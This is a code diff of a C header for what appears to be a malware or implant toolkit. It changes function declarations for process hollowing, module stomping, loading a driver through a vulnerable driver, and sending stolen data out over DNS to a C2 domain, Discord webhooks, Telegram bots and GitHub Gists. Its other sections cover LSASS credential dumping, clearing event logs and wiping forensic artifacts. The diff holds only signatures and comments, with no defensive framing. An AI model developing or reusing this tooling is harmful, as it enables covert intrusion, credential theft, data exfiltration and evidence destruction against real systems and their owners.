@@ -349,11 +349,8 @@ bool jocky_dse_load_driver(jocky_byovd_t* ctx,
 
 #ifdef _WIN32
 
-/* Process hollowing — create target_path suspended, replace its image with
- * payload, fix the entry point in the thread context, resume. */
-bool jocky_process_hollow(const wchar_t* target_path,
-                          const uint8_t* payload,
-                          size_t payload_size);
+/* Windows: create target_path suspended, replace image with payload, resume.
+ * Linux: write payload to tmpfile, fork+execve under target_path name. */
 
 /* Module stomping — find module_name in pid's loaded-module list, make its
  * region RWX, overwrite with payload (headers + sections), execute at EP. */
@@ -407,24 +404,12 @@ bool jocky_exfil_front(const char* front_host, const char* real_host,
  * c2_domain.  The authoritative resolver for that domain logs all queries.
  * Format: <4-hex-seq>.<16-char-b32-chunk>.<c2_domain>
  * Terminates with a FFFF.END.<c2_domain> sentinel query. */
-bool jocky_exfil_dns(const char* c2_domain,
-                      const uint8_t* data, size_t data_len);
-
-/* Discord webhook — POST base64(data) as message content.
- * webhook_url is the full URL including token.
- * Chunks at 1 500 bytes to stay within Discord's 2 000-char limit. */
-bool jocky_exfil_discord(const char* webhook_url,
-                          const uint8_t* data, size_t data_len);
-
-/* Telegram Bot API — POST base64(data) as sendMessage text.
- * Chunks at 3 000 bytes (Telegram's 4 096-char limit). */
+bool jocky_exfil_dns(const char* c2_domain, const int8_t* data, int32_t size);
+bool jocky_exfil_discord(const char* webhook_url, const int8_t* data, int32_t size);
 bool jocky_exfil_telegram(const char* bot_token, const char* chat_id,
-                           const uint8_t* data, size_t data_len);
-
-/* GitHub Gist — PATCH a Gist file named "d.txt" with base64(data).
- * token must have the gist scope. */
+                           const int8_t* data, int32_t size);
 bool jocky_exfil_github(const char* token, const char* gist_id,
-                         const uint8_t* data, size_t data_len);
+                         const int8_t* data, int32_t size);
 
 /* ── LSASS credential dump ─────────────────────────────────────────────── */
 
@@ -474,7 +459,10 @@ bool jocky_clear_logs(void);
 
 /* Delete Prefetch .pf files, Recent shortcuts, and %TEMP% contents.
  * Uses Win32 file APIs — no child processes spawned. */
-bool jocky_wipe_artifacts(void);
+void jocky_wipe_artifacts(const char* dir);
+
+/* Clear comma-separated event log channel names, or all channels if NULL. */
+int32_t jocky_cleanup_event_logs(const char* channels);
 
 /* Delete all .pf files from %SystemRoot%\Prefetch. */
 bool jocky_wipe_prefetch(void);
@@ -589,6 +577,9 @@ bool jocky_module_has_symbol(void* handle, const char* symbol_name);
  * Returns base address, or 0 if not found/not loaded
  */
 uintptr_t jocky_module_base(const char* path);
+
+/* Cross-platform process hollowing */
+bool jocky_process_hollow(const char* target_path, int8_t* payload, int32_t payload_size);
 
 #ifndef _WIN32
 /* ============================================================================
